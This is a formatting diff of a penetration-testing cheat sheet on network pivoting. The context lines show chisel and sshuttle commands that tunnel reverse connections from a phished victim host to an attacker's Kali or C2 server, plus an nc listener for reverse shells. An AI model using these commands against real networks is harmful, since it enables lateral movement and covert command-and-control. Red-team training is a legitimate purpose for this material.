@@ -69,6 +69,7 @@ sshuttle -v -r user@sshGateway network/netmask -e 'ssh -i /path/to/private_key'
 ./chisel client -v <YOUR_KALI_IP>:8000 R:4444:10.10.10.240:80
 
 ```
+
 * Remote/Reverse Forwarding (for *reverse connections* [i.e. reverse_tcp])
     * Quick Diagrams for the visual people
         * [INTERNET_ISOLATED_MACHINE] --> [Pivot_Machine] --(FIREWALL)--(INTERNET)-- [C2/Kali]
@@ -79,11 +80,13 @@ sshuttle -v -r user@sshGateway network/netmask -e 'ssh -i /path/to/private_key'
         * Let us call this [Pivot Machine]: *PHISHEDVICTIM01.acme.local*
         * *BEWARE*: May trigger _Windows Firewall Allow/Deny_ pop-up window on this host upon running. May need to allow first or create a manual firewall entry via cli or choose a firewall port already allowed but unused by a service.
         * The command below will direct any traffic it receives on 3333/tcp to your Kali 3333/tcp
+
             ```batch
             chisel.exe client -v <YOUR_KALI_IP>:8000  3333:127.0.0.1:3333
             #OR
             chisel.exe client -v <YOUR_C2_domain>:443 3333:127.0.0.1:3333
             ```
+
     * After the command above, execute the command below on your Kali/c2 machine or something similar (i.e. `exploit/multi/handler`)
         ```bash
         nc -lnvp 3333
